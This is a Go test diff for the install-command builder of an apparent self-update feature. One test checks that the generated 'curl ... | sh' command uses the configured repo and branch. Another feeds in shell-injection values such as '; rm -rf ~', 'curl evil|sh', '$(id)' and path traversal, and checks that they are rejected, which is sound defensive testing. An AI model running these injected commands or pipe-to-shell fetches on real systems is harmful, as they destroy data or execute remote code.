@@ -143,3 +143,46 @@ func TestProbe_SameCommitNotAvailable(t *testing.T) {
 		t.Errorf("same head as currentSHA should not flag; got %+v", info)
 	}
 }
+
+func TestInstallCommand_UsesConfiguredRepoAndBranch(t *testing.T) {
+	got, err := installCommand("me/bee-fork", "release/1.x")
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := "curl -fsSL https://raw.githubusercontent.com/me/bee-fork/release/1.x/install.sh | sh"
+	if got != want {
+		t.Errorf("got %q\nwant %q", got, want)
+	}
+	up, err := installCommand("", "")
+	if err != nil || up != "curl -fsSL "+InstallURL+" | sh" || InstallCommandFor("", "") != up {
+		t.Errorf("defaults must stay upstream: %q, %v", up, err)
+	}
+}
+
+func TestInstallCommand_RejectsUnsafeTargets(t *testing.T) {
+	bad := [][2]string{
+		{"me/bee; rm -rf ~", "main"},
+		{"me/bee", "main && curl evil|sh"},
+		{"me/bee", "main`id`"},
+		{"me/bee", "$(id)"},
+		{"me/bee", "a b"},
+		{"me/bee", "main/../../x"},
+		{"me/bee", "-o"},
+		{"../..", "main"},
+		{"me", "main"},
+		{"me/bee/extra", "main"},
+		{"me/bee", "main\nid"},
+		{"me/bee", "main'x"},
+	}
+	for _, c := range bad {
+		if line, err := installCommand(c[0], c[1]); err == nil {
+			t.Errorf("repo=%q branch=%q accepted: %q", c[0], c[1], line)
+		}
+		if out, err := ApplyFor(context.Background(), c[0], c[1]); err == nil || out != nil {
+			t.Errorf("ApplyFor(%q, %q) ran: %q, %v", c[0], c[1], out, err)
+		}
+	}
+	if got := InstallCommandFor("me/bee;x", "main"); strings.Contains(got, "curl") {
+		t.Errorf("invalid target must not render a command: %q", got)
+	}
+}
